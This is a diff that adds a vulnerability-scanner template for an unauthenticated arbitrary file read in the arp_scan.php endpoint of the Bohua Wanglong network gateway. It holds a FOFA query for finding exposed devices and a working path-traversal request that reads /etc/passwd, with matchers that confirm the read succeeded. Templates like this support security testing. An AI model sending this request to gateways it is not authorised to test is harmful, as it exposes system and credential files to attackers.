@@ -1,0 +1,31 @@
+id: bohuawanglong-arp_scan_php-File-reading
+
+info:
+  name: 中科博华网龙网关 arp_scan.php 任意文件读取漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: title="博华网龙"
+    中科博华网龙网关 arp_scan.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
+  reference:
+    - https://mp.weixin.qq.com/s/nLP5coU3ljQRXMoUKfvykQ
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /firewall/arp_scan.php?ifname=/../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'sshd:x'
+          - '/sbin/nologin'
+        condition: and
+      - type: status
+        status: 
+          - 200
